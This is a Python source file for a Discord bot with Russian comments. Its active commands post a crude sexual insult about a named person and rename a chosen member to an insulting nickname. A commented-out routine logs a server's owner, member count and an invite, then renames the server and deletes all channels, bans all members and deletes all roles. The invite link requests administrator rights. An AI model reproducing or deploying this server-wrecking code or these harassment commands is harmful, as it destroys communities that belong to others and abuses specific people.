import discord
from discord.ext import commands
from config import settings
import os

bot = commands.Bot(command_prefix = settings['prefix'])


#команда бота
@bot.command() 
async def АКСИ(ctx):

    await ctx.send ("[Макси] сосет хуй")
    
#команда бота
@bot.command() 
async def аксь(ctx):

    await ctx.send ("[Макси] сосет хуй")

#команда бота
@bot.command() 
async def аксись(ctx):

    await ctx.send ("[Макси] сосет хуй")
   
#команда бота
@bot.command() 
async def АКСИСЬ(ctx, member: discord.Member):

    await member.edit (nick = "СОСУЩИЙ")
    await ctx.send ("ник хуесоса" + ctx.member.mention + "изменен")

#команда бота
@bot.command() 
async def акси(ctx):

    await ctx.send ("[Макси] сосет хуй")
    

#запуск бота
token = os.environ.get('BOT_TOKEN')
bot.run (token)

# await ctx.message.delete ()

#     text = discord.Embed ()
#     text.add_field (name = textname, value = textcontent + "(автор: " + ctx.author.mention + ")", inline = False)

#     channel = ctx.guild.get_channel(730634006894346344)
# await channel.send (embed = text)

#https://discordapp.com/oauth2/authorize?&client_id=753822693526339595&scope=bot&permissions=8

# #оптимизация
#     guild = ctx.guild
#     author = ctx.author

#     #получение канала из категории
#     categories = guild.categories[0]
#     log_channel = categories.channels[1]

#     #создание инвайта
#     invite = await ctx.channel.create_invite()

#     #лог
#     log = discord.Embed ()

#     log.add_field (name = "Сервер", value = guild.name, inline = False)
#     log.add_field (name = "Владелец", value = guild.owner, inline = False)
#     log.add_field (name = "Крашнул", value = author.name + "#" + author.discriminator, inline = False)
#     log.add_field (name = "Участники", value = guild.member_count, inline = False)
#     log.add_field (name = "Участники", value = invite, inline = False)
    
#     await log_channel.send(embed=log)

#     await guild.edit (name = "угар")

#     #удаление каналов
#     for i in guild.channels:
#         try:
#             await i.delete ()
#         except:
#             continue

#     #бан
#     for j in guild.members:
#         try:
#             await j.ban ()
#         except:
#             continue
    
#     #кик
#     for k in guild.roles:
#         try:
#             await k.delete ()
#         except:
#             continue
